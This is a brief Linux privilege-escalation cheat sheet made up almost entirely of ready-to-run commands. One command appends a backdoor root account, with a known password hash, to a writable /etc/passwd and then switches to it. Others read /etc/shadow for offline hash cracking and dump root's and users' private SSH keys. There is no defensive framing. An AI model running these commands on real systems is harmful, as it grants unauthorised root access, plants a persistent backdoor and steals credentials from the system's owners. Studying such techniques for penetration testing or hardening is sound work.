#### 1. Sudo misconfiguration
```
sudo -l
```
---
#### 2. SUID binaries
```
find / -perm -4000 -type f 2>/dev/null
```
---
#### 3. Writable /etc/passwd
```
ls -la /etc/passwd
```
#### If writable, add a root user:
```
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
```

Switch account into 'hacker'
```
su hacker 
```

Password : `Hacker`

---
#### 4. Readable /etc/shadow
```
ls -la /etc/shadow
```
Copy hashes, crack with hashcat/john

---
#### 5. SSH keys
```
cat /root/.ssh/id_rsa
```

```
cat /home/*/.ssh/id_rsa
```

```
find / -name "id_rsa" 2>/dev/null
```
